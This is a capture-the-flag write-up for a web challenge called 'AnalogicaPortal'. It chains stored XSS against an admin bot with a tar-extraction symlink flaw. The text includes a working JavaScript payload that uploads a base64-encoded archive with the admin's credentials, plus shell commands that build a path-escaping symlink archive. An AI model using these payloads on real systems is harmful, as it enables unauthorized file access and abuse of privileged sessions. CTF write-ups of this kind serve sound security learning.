# AnalogicaPortal
## Recon
There is an automated web client mechanic in `bot.py`, implying some kind of XSS vulnerability. The Bot accesses the URL `/review` after logging in as admin, listing bug reports on firmware.

The field `report.issue` is not being escaped properly, making it prone to XSS. After creating a user account, we can file a report on any firmware.

Because the session cookie is HttpOnly, we cannot simply exfiltrate it and spoof the admin login session. [XST](https://owasp.org/www-community/attacks/Cross_Site_Tracing) does not work as the TRACE method is being blocked by modern browsers, [cookie overflowing](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-jar-overflow) doesn't seem to work either. What we could do though is upload a piece of firmware directly within our payload. 

The next exploitation vector explored is the endpoint `/api/firmware/upload`, which calls the function `extract_firmware` where the use of `tar.extractall` can lead to [undesired sideeffects](https://docs.python.org/2.7/library/tarfile.html#tarfile.TarFile.extractall) when extracting archives.

So there are 2 steps to building an exploit:
* Create the XSS payload to upload a malicious archive
* Create a malicious archive containing a symlink to the flag

## Exploitation
XSS Payload:
```
<script>
const file = 'H4sIAAAAAAAAA+3PQQqDMBCF4RwlJ0jimJrzBKElIEZsCj2+0WVBXVRc/R8Mb2AWM2OMjdO01pD6WFIe7bvU7O1ziC9TvkX9zVUhhC2r39z6xot3nRfpRLkmPHyrtFx4w65PfXfWWs05H645mwMAAAAAAAAAAAAAAAAAcKMFKgwXTwAoAAA='
const bChars = atob(file);
const bNumbers = new Array(bChars.length);
for (let i = 0; i < bChars.length; i++) {
    bNumbers[i] = bChars.charCodeAt(i);
}
const bytes = new Uint8Array(bNumbers);

let data = new FormData()
data.append('file', new Blob([bytes], {type: 'application/gzip'}), 'xxx.tar.gz')

fetch('/api/firmware/upload', {
  method: 'POST',
  body: data,
  credentials: 'include'
})
</script>
```

We can build malicious archives containing symlinks to either absolute or relative paths. Since the `tar.extractall` call is being executed within the dir `/tmp`, we focus on [escaping this directory](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload).

Malicious archive (make sure to run using GNU tar for -P option):
```
$ cd tmp
$ sudo touch /flag.txt
$ sudo mkdir -p ../app/application/static
$ ln -s /flag.txt ../app/application/static/flag.txt
$ tar fcz mal.tar.gz -P ../app/application/static/flag.txt
$ base64 mal.tar.gz
$ sudo rm -rf ../app/application/static
```

After sending in the XSS payload, we can access the flag on `/static/flag.txt`.